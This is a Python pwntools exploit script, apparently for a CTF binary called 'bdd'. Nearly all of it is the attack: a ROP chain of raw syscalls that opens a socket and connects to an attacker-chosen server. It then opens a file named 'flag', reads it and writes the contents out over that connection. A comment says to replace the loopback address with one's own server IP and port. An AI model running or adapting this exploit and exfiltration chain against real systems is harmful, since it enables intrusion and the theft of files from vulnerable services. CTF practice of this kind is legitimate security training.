#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = ''
port = ''
reomote_addr = [ip,port]
binary = './bdd'

libc = ELF('/home/tamako/Desktop/tools/libc2.34/lib64/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

push_rax_pop_rcx_ret = 0x000000000040135C
pop_rax_ret = 0x000000000040135A
pop_rbp_ret = 0x0000000000401364
pop_rdi_ret = 0x0000000000401356
pop_rdx_ret = 0x0000000000401354
pop_rsi_ret = 0x0000000000401358
pop_rcx_ret =0x000000000040135d
mov_rdi_rcx_ret = 0x000000000040135F
syscall_ret = 0x0000000000401351



payload = 'a'*0x8 + 'junkjunk'
# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) 41
payload += p64(pop_rdi_ret) + p64(2) + p64(pop_rsi_ret) + p64(1) + p64(pop_rdx_ret) + p64(0)
payload += p64(pop_rax_ret) + p64(41) + p64(syscall_ret)

##connect(soc, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr_in)) 0x4038e0->struct
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(0x4038e0) + p64(pop_rdx_ret) + p64(16)
payload += p64(pop_rax_ret) + p64(42) + p64(syscall_ret)

#dup2(soc, 1)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_ret)
payload += p64(1)
payload += p64(pop_rax_ret)
payload += p64(33)
payload += p64(syscall_ret)
#open
payload += p64(pop_rdi_ret)
payload += p64(0x4038d0)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(2)
payload += p64(syscall_ret)

#read(rax,0x403400,0x100)
payload += p64(push_rax_pop_rcx_ret)
payload += p64(mov_rdi_rcx_ret)
payload += p64(pop_rsi_ret)
payload += p64(0x403400)
payload += p64(pop_rdx_ret)
payload += p64(0x100)
payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(syscall_ret)

#write(1,0x403400,0x100)
payload += p64(pop_rax_ret)
payload += p64(1)
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(syscall_ret)
payload = payload.ljust(0x1d0,"a")
payload += "flag\x00\x00\x00\x00"
payload += "\x00"*8

# 127.0.0.1 1000
#其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET
payload += p64(0x0100007fe8030002)#改成⾃⼰的服务器的ip端⼝
p.recv()


# attach(p,'b *0x00000000004013FA')
pause()
sd(payload)
pause()
it()